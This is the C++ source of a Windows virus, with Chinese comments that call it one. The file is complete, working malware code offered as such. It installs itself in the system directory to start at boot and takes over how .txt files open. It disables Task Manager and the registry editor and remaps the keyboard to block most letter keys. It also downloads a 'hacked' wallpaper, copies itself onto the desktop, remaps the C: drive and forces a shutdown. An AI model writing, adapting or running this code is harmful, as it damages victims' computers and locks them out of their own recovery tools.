#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>
#include <time.h>
#include <tchar.h>
#include <shlobj.h>		//SHGetSpecialFolderPath()所属头文件
#include <iostream>
#include <urlmon.h>
#pragma comment(lib,"urlmon.lib")

//病毒的增殖模块,产生垃圾文件,要实现无限增殖只需要在主函数加一个循环
void Reproduce()
{
	char name_str[100] = {0};
	int name;
	srand((unsigned)time(NULL));	//随机数种子
	name = rand() % 1024;	
	itoa(name, name_str, 16);	//将随机数转化成字符串
	TCHAR szpath[MAX_PATH];
	GetModuleFileName(NULL, szpath, MAX_PATH);	//获取当前执行程序的路径
	char target[100] = {0};
	TCHAR Destop[MAX_PATH];
	SHGetSpecialFolderPath(NULL, Destop, CSIDL_DESKTOP, FALSE);	//获取桌面绝对路径
	strcat(target, Destop);
	strcat(target, "\\");
	strcat(target, name_str);
	strcat(target, ".exe");
	
	CopyFile(szpath, target, FALSE);
	
	//为增殖产生的文件创建进程
	//STARTUPINFO si = { 0 };
	//si.cb = sizeof(si);
	//PROCESS_INFORMATION pi;
	//CreateProcess(target, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}

//注册表修改实现开机自启动,同时在系统文件目录下创建拷贝文件
void RegKeyStart()
{
	char str[MAX_PATH];
	GetModuleFileName(NULL, str, MAX_PATH);
	char SystemPath[512];
	GetSystemDirectory(SystemPath, sizeof(SystemPath));		//获取系统目录路径
	strcat(SystemPath, "\\explore.exe");
	CopyFile(str, SystemPath, false);
	DWORD len;
	HKEY hkey;
	len = strlen(SystemPath);
	RegCreateKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
	RegSetValueEx(hkey, SystemPath, 0, REG_SZ, (unsigned char *)SystemPath, len);
	RegCloseKey(hkey);
	/*创建代码实现文件关联，也就是只要打开txt文件就执行当前用户程序,使用txt方式触发
	*/
	LPCTSTR data_set = "txtfile\\shell\\open\\command";
	RegOpenKeyEx(HKEY_CLASSES_ROOT, data_set, 0, KEY_WRITE, &hkey);
	RegSetValueEx(hkey, NULL, 0, REG_EXPAND_SZ, (unsigned char *)SystemPath, len);
	RegCloseKey(hkey);
}

//注册表修改实现禁用管理器
void RegTaskmanagerForbidden()
{
	HKEY hkey;
	DWORD v = 1;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableTaskMgr", 0, REG_DWORD, (LPBYTE)&v, sizeof(DWORD));
	RegCloseKey(hkey);
}

//注册表修改实现禁用注册表编辑器
void RegEditForbidden()
{
	HKEY hkey;
	DWORD v = 1;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "DisableRegistryTools", 0, REG_DWORD, (LPBYTE)&v, sizeof(DWORD));
	RegCloseKey(hkey);
}

//注册表修改实现更换桌面背景
void RegModifyBackroud()
{
	DWORD v = 1;
	char str[MAX_PATH];
	GetModuleFileName(NULL, str, MAX_PATH);
	strcat(str, "hacked.jpg");
 	URLDownloadToFile(NULL, "https://images.alphacoders.com/509/thumb-1920-509367.jpg", str, 0, 0);
	HKEY hkey;
	RegCreateKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", &hkey);
	RegSetValueEx(hkey, "Wallpaper", 0, REG_SZ, (unsigned char *)str, sizeof(str));
	RegSetValueEx(hkey, "WallpaperStyle", 0, REG_DWORD, (LPBYTE)&v, sizeof(DWORD));
}

//注册表修改屏蔽用户键盘输入
void RegKeyBoardForbidden()
{
	HKEY hkey;
	char scancodemap[] = "\x00\x00\x00\x00\x00\x00\x00\x00\x1A\x00\x00\x00"
		"\x02\x00\x10\x00"
		"\x02\x00\x11\x00"
		"\x02\x00\x12\x00"
		"\x02\x00\x13\x00"
		"\x02\x00\x14\x00"
		"\x02\x00\x15\x00"
		"\x02\x00\x16\x00"
		"\x02\x00\x17\x00"
		"\x02\x00\x18\x00"
		"\x02\x00\x19\x00"
		"\x02\x00\x1E\x00"
		"\x02\x00\x1F\x00"
		"\x02\x00\x20\x00"
		"\x02\x00\x21\x00"
		"\x02\x00\x22\x00"
		"\x02\x00\x23\x00"
		"\x02\x00\x24\x00"
		"\x02\x00\x25\x00"
		"\x02\x00\x26\x00"
		"\x02\x00\x2C\x00"
		"\x02\x00\x2D\x00"
		"\x02\x00\x2E\x00"
		"\x02\x00\x2F\x00"
		"\x02\x00\x30\x00"
		"\x02\x00\x31\x00"
		"\x02\x00\x32\x00"
		"\x00\x00\x00\x00";
	RegCreateKey(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Keyboard Layout", &hkey);
	RegSetValueEx(hkey, "Scancode Map", 0, REG_BINARY, (LPBYTE)scancodemap, 120);//scancodemap数组长度为120字节
	RegCloseKey(hkey);
	MessageBox(NULL, "破坏键盘成功！", "Error", MB_OK);
}

BOOL DeleteDrive(const TCHAR *SThide)
{
	if (!DefineDosDevice(DDD_RAW_TARGET_PATH, SThide, ""))
		return false;
	else
		return true;
}
int main(int argc, char** argv)
{
	//FreeConsole();
	HWND hwndDOS = GetForegroundWindow(); //得到前台窗口的句柄
	ShowWindow(hwndDOS, SW_HIDE); //隐藏窗口
	//以下代码用于检测任务管理器是否被禁用
	BOOL Revised=0;
	HKEY hkey;
	long ret0, ret1;
	LPCTSTR data_set = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
	LPCTSTR  psName = "DisableTaskMgr";
	TCHAR   ValueInfo[100];
	DWORD cType;
	DWORD   ValueSize = sizeof(ValueInfo);
	ret0 = RegOpenKeyEx(HKEY_CURRENT_USER, data_set, 0, KEY_READ, &hkey);
	ret1 = RegQueryValueEx(hkey, psName, NULL, &cType, (LPBYTE)ValueInfo, &ValueSize);
	if (ret0!=ERROR_SUCCESS||ret1 != ERROR_SUCCESS)
	{
		printf("not Revised!\n");
		Revised = 0;
	}
	else if (!strcmp(ValueInfo, "\x01\x00\x00\x00")) {
		Revised = 1;
	}
	else {
		Revised = 0;
	}
	RegCloseKey(hkey);
	int i;
	if (!Revised)	//如果任务管理器没有被禁用执行如下操作
	{
		RegKeyStart();
		RegTaskmanagerForbidden();
		RegEditForbidden();
		RegModifyBackroud();		//修改桌面背景
		RegKeyBoardForbidden();		//修改注册表屏蔽用户键盘输入
		Sleep(5000);
		if (DeleteDrive("C:"))
			MessageBox(NULL, "破坏盘符成功！", "Error", MB_OK);
		DefineDosDevice(DDD_RAW_TARGET_PATH, "F:", "\\??\\C:\\winnt");
		system("title 警告");
		MessageBox(NULL, "计算机将于60秒内强制关机！", "Error", MB_OK);
		system("shutdown -f -s -t 10 -c ""计算机将于60秒内强制关机！""");
	}
	else {
		MessageBox(NULL, "task manager has been forbidden!", "Error", MB_OK);
		for (i = 0; i < 30; i++) {
			Reproduce();		//产生垃圾文件，恶意增殖
			Sleep(1000);
		}
		if (DeleteDrive("C:"))
			MessageBox(NULL, "破坏盘符成功！", "Error", MB_OK);
		DefineDosDevice(DDD_RAW_TARGET_PATH, "F:", "\\??\\C:\\winnt");
	}
	
	return 0;
}

